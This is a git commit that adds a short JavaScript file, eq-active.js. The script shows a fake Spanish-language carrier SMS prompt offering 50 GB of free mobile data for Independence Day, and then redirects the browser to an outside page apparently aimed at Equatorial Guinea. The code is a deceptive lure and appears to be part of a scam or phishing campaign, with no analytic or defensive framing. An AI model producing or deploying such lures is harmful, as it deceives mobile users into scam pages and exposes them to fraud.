92f15ef682a716020cf2dcade9c5ba879df75f2e
itidnewblog1 <newblog1itid@gmail.com>
2025-10-06 22:11:15 +0100

    Create eq-active.js

---
+++ eq-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVAR 50GB'
+password=prompt('SMS: Feliz Independencia, tu número móvil es elegible para recibir 50 GB de datos gratis, haz clic en Aceptar para activar ahora','ACTIVAR 50GB');
+if (password != 'ACTIVAR 50GB') {
+location.href='https://rhward.org/equatorialguinea.html';
+}
